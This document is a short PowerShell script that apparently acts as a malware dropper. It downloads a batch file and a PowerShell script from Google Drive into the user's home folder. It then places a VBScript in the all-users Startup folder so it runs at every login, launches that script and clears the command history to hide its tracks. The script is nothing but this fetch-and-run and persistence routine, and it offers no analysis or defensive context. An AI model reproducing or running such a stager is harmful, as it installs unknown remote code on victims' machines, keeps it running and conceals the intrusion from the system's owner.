cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1FvnhxznvSAdg432ZJv2Scw9dXKO6a6oc" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xejGhEY1YxEJNanzlceGfv9SVNdGpDEg" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1Xb04koBk_3V7TowsMP3kaqgpBAWJZz5x" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit
